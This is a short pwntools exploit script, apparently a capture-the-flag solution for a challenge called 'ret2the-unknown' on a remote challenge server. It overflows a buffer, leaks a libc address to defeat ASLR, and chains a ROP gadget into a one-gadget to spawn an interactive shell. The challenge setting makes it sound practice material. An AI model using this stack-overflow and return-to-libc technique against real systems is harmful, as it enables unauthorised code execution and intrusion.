from pwn import *

DEBUG = False

if DEBUG:
    r = process("./ret2the-unknown", env={"LD_PRELOAD":"./libc-2.28.so"})
    gdb.attach(r)
    offset2base = 361824
else:
    r = remote("mc.ax", 31568)
    offset2base = 361824

print(r.recvuntil("safely?"))

payload = "a"*40 + p64(0x0000000000401186)
r.sendline(payload)

res1 = r.recvuntil("good luck!")
print(res1)

prinf_addr = int(res1[-23:-10],16)
base_addr = prinf_addr - offset2base

print(hex(base_addr))

rop_rax = base_addr + 0x0000000000098385
sys_gadget = base_addr + 0x4484f

payload2 = "a"*40 + p64(rop_rax) + p64(sys_gadget)
r.sendline(payload2)

print(r.recv())

r.interactive()